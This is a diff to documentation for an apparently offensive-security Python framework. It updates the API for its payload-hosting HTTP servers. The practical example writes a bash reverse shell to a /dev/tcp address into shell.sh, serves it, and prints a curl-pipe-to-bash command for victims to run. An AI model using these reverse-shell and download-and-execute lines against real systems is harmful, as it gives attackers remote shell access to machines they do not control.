@@ -313,9 +313,11 @@ enumerator.enumerate(threads=10)
 
 ## HTTP Server
 
+> **Note:** For comprehensive HTTP server documentation including `SimpleHTTPServer`, `PayloadServer`, `ExfilServer`, and custom server creation, see [HTTP Server API](httpserver.md).
+
 ### PHTTPServer
 
-Payload hosting with SSL support.
+Low-level HTTP/HTTPS server with SSL support. Multiple instances can run simultaneously on different ports.
 
 **Basic Usage:**
 
@@ -326,7 +328,7 @@ from ofx.api.httpserver import PHTTPServer
 server = PHTTPServer(bind_ip='0.0.0.0', bind_port=8080)
 server.start(daemon=True)
 
-print(f"Server running at: {server.get_url()}")
+print(f"Server running at: {server.url}")
 # Server running at: http://192.168.1.100:8080
 
 # Keep server running
@@ -338,7 +340,7 @@ server.stop()
 **HTTPS Server:**
 
 ```python
-# Generate self-signed certificate
+# Auto-generate self-signed certificate
 server = PHTTPServer(
     bind_ip='0.0.0.0',
     bind_port=443,
@@ -348,24 +350,27 @@ server = PHTTPServer(
 # Start in background
 server.start(daemon=True)
 
-print(f"HTTPS Server: {server.get_url()}")
+print(f"HTTPS Server: {server.url}")
 # HTTPS Server: https://192.168.1.100:443
 ```
 
-**Custom Directory:**
+**Running Multiple Servers:**
 
 ```python
-# Serve from custom directory
-server = PHTTPServer(
-    bind_ip='0.0.0.0',
-    bind_port=8000,
-    directory='/path/to/payloads'
-)
-server.start(daemon=True)
+from ofx.api.httpserver import PHTTPServer, SimpleHTTPServer, PayloadServer
 
-# Clients can now access files:
-# http://server-ip:8000/payload.exe
-# http://server-ip:8000/exploit.sh
+# Run multiple servers simultaneously
+server1 = SimpleHTTPServer(port=8000)
+server2 = PayloadServer(port=8080)
+
+server1.start()
+server2.start()
+
+print(f"File server: {server1.url}")
+print(f"Payload server: {server2.url}")
+
+server1.stop()
+server2.stop()
 ```
 
 **Practical Examples:**
@@ -385,25 +390,15 @@ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 (payload_dir / 'shell.sh').write_text(reverse_shell)
 
 # Start server
-server = PHTTPServer(bind_ip='0.0.0.0', bind_port=8080, directory=str(payload_dir))
+from ofx.api.httpserver import SimpleHTTPServer
+server = SimpleHTTPServer(port=8080, directory=str(payload_dir))
 server.start(daemon=True)
 
-print(f"Download with: curl {server.get_url()}/shell.sh | bash")
+print(f"Download with: curl {server.url}/shell.sh | bash")
 
 # IPv6 support
-server_v6 = PHTTPServer(bind_ip='::', bind_port=8080, ipv6=True)
+server_v6 = PHTTPServer(bind_ip='::', bind_port=8080)
 server_v6.start(daemon=True)
-```
-
-**Auto Port Selection:**
-
-```python
-# Automatically find available port
-server = PHTTPServer(bind_ip='0.0.0.0')
-server.auto_port()  # Finds available port between 8000-9000
-server.start(daemon=True)
-
-print(f"Server started on: {server.get_url()}")
 ```
 
 ## Workflow Integration
